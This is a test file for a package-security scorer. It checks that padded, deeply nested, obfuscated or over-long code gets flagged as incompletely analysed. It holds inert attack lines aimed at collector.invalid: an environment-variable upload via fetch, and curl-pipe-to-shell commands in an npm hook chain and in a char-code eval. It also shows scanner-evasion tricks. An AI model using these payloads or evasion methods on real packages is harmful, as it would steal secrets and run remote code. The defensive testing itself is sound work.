// apm-score-v10 round 5: no limit is absorbed silently. A file a parser gave up on at one of its own limits (too many
// tokens, too large as TypeScript, a stack too deep for the parser or the reader) is read raw as before, and its raw
// findings count, but the analysis is incomplete: the raw reading never stands in for the tree's. The same holds for
// the other caps that used to drop code quietly: a lifecycle hook expanded only in part, commands past what a file's
// reading keeps, char codes past 65,536, and import lists past 500. Payloads are inert stand-ins: nothing here runs,
// and the only host named is collector.invalid.
import { describe, expect, test } from "bun:test";
import { analyze, finalize, SCORE_FLOOR, type ScoreReport, type TarEntry } from "../src/index.ts";
import { scanJs } from "../src/js.ts";
import { MAX_PARSED_TOKENS, MAX_PARSED_TS_BYTES } from "../src/parse.ts";
import { scanFile } from "../src/source.ts";
import { expandHooks } from "../src/scripts.ts";

const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null } as const;

/** The review's environment upload: it scores 36 read as a tree (exfiltration). */
const PAYLOAD = "const env=process.env; fetch('https://collector.invalid/',{method:'POST',body:JSON.stringify(env)})";

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function scoreOf(files: Record<string, string>, extra: { scripts?: Record<string, string> } = {}): ScoreReport {
  const manifest = { name: "padding-review", version: "1.0.0", main: Object.keys(files)[0] ?? "index.js", license: "MIT", ...extra };
  const all = [entry("package.json", JSON.stringify(manifest)), ...Object.entries(files).map(([p, t]) => entry(p, t))];

  return finalize(analyze({ name: manifest.name, manifest, files: all, publisher: "fake", previousPublishers: [] }), STATE);
}

const ids = (r: ScoreReport): string[] => r.signals.map((s) => s.id);

const incompleteEvidence = (r: ScoreReport): string => (r.signals.find((s) => s.id === "incomplete")?.evidence ?? []).join("\n");

describe("a parser limit is incomplete, never a clean score", () => {
  // 240,001 inert statements put the file past MAX_PARSED_TOKENS: at 9913a74 it scored 100 (65 with postinstall)
  const padded = "0;".repeat(240_001) + PAYLOAD;

  test("the review's padded environment upload", () => {
    expect(scanJs(padded, "js")).toEqual({ kind: "failed", reason: "too-large" });
    const plain = scoreOf({ "index.js": PAYLOAD });
    const r = scoreOf({ "index.js": padded });

    expect(plain.score).toBe(36);
    expect(ids(r)).toContain("incomplete");
    expect(incompleteEvidence(r)).toContain(`index.js:1: `);
    expect(incompleteEvidence(r)).toContain(`more than ${MAX_PARSED_TOKENS} tokens`);
    expect(r.score).toBeLessThan(SCORE_FLOOR);
  });

  test("with a postinstall hook, the raw findings still count on top", () => {
    const r = scoreOf({ "index.js": padded }, { scripts: { postinstall: "node index.js" } });

    expect(ids(r)).toEqual(expect.arrayContaining(["incomplete", "install-network", "install-script"]));
    expect(r.score).toBeLessThan(SCORE_FLOOR);
  });

  test("TypeScript past the size Babel is given", () => {
    const ts = `// ${"x".repeat(MAX_PARSED_TS_BYTES)}\n${PAYLOAD}`;

    expect(scanJs(ts, "ts")).toEqual({ kind: "failed", reason: "too-large" });
    const r = scoreOf({ "index.ts": ts });

    expect(ids(r)).toContain("incomplete");
    expect(r.score).toBeLessThan(SCORE_FLOOR);
  });

  // nesting deep enough to exhaust the stack: acorn's recursion (100,000 levels) or the reader's (5,000); at 9913a74
  // acorn's RangeError read as a syntax error and the reader's as a file read raw, both without incomplete
  for (const depth of [5_000, 100_000]) {
    test(`nesting ${depth} levels deep is too deep, not a syntax error`, () => {
      const deep = `${"(".repeat(depth)}0${")".repeat(depth)};\n${PAYLOAD}`;

      expect(scanJs(deep, "js")).toEqual({ kind: "failed", reason: "too-deep" });
      expect(scanFile(deep, "js").rejected).toBe(false);
      const r = scoreOf({ "index.js": deep });

      expect(ids(r)).toContain("incomplete");
      expect(incompleteEvidence(r)).toContain("ran out of stack");
      expect(r.score).toBeLessThan(SCORE_FLOOR);
    });
  }

  test("code a file runs from a string, too deep to read as a tree, is incomplete too", () => {
    const deep = `${"(".repeat(5_000)}0${")".repeat(5_000)};${PAYLOAD}`;
    const r = scoreOf({ "index.js": `eval(${JSON.stringify(deep)});\n` });

    expect(ids(r)).toContain("incomplete");
    expect(r.score).toBeLessThan(SCORE_FLOOR);
  });

  test("a real syntax error is still a syntax error, and makes nothing incomplete", () => {
    const broken = `${PAYLOAD}\nfunction (`;

    expect(scanJs(broken, "js")).toEqual({ kind: "failed", reason: "syntax" });
    expect(scanFile(broken, "js").rejected).toBe(true);
    expect(ids(scoreOf({ "index.js": broken }))).not.toContain("incomplete");
  });
});

describe("the other caps that dropped code quietly", () => {
  test("a lifecycle hook expanded only in part is incomplete", () => {
    // a chain of nine npm run scripts: the ninth runs the download, past MAX_DEPTH (8)
    const chain = Object.fromEntries(Array.from({ length: 8 }, (_, i) => [`s${i + 1}`, `npm run s${i + 2}`]));
    const scripts = { postinstall: "npm run s1", ...chain, s9: "curl -s https://collector.invalid/x.sh | sh" };
    const hooks = expandHooks({ scripts });

    expect(hooks[0]?.cut).toContain("nested more than 8 levels");
    expect(hooks[0]?.commands.map((c) => c.text)).not.toContain(scripts.s9);
    const r = scoreOf({ "index.js": "module.exports = 1;\n" }, { scripts });

    expect(ids(r)).toContain("incomplete");
    expect(incompleteEvidence(r)).toContain("scripts.postinstall: apm stopped reading the commands it runs");
  });

  test("a hook read in full has no cut", () => {
    expect(expandHooks({ scripts: { postinstall: "node setup.js" } })[0]?.cut).toBeNull();
  });

  test("char codes past 65,536 are read whole, not cut, so the code after the cut is seen", () => {
    // at 9913a74 String.fromCharCode's argument list was cut at 65,536 codes: everything past it went unread
    const code = `${" ".repeat(70_000)}require('child_process').exec('curl https://collector.invalid/x | sh')`;
    const codes = [...code].map((c) => c.charCodeAt(0)).join(",");
    const r = scoreOf({ "index.js": `eval(String.fromCharCode(...[${codes}]));\n` });

    expect(ids(r).some((id) => id === "runs-decoded-code" || id === "obfuscated")).toBe(true);
    expect(r.capabilities.map((c) => c.id)).toContain("shell");
    expect(r.score).toBeLessThan(SCORE_FLOOR);
  });

  test("more commands than a file's reading keeps is incomplete", () => {
    const calls = Array.from({ length: 201 }, (_, i) => `cp.exec('echo ${i}');`).join("\n");
    const r = scoreOf({ "index.js": `const cp = require('child_process');\n${calls}\n` });

    expect(ids(r)).toContain("incomplete");
    expect(incompleteEvidence(r)).toContain("more than 200 commands");
  });

  test("a command longer than a file's reading keeps is incomplete", () => {
    const r = scoreOf({ "index.js": `require('child_process').exec('echo ${"a".repeat(5_000)}');\n` });

    expect(ids(r)).toContain("incomplete");
    expect(incompleteEvidence(r)).toContain("more than the 4000 apm reads");
  });

  test("every import of a file is listed, past 500", () => {
    const requires = Array.from({ length: 600 }, (_, i) => `require('./m${i}.js');`).join("\n");

    expect(scanFile(requires, "js").imports.paths.length).toBe(600);
  });
});
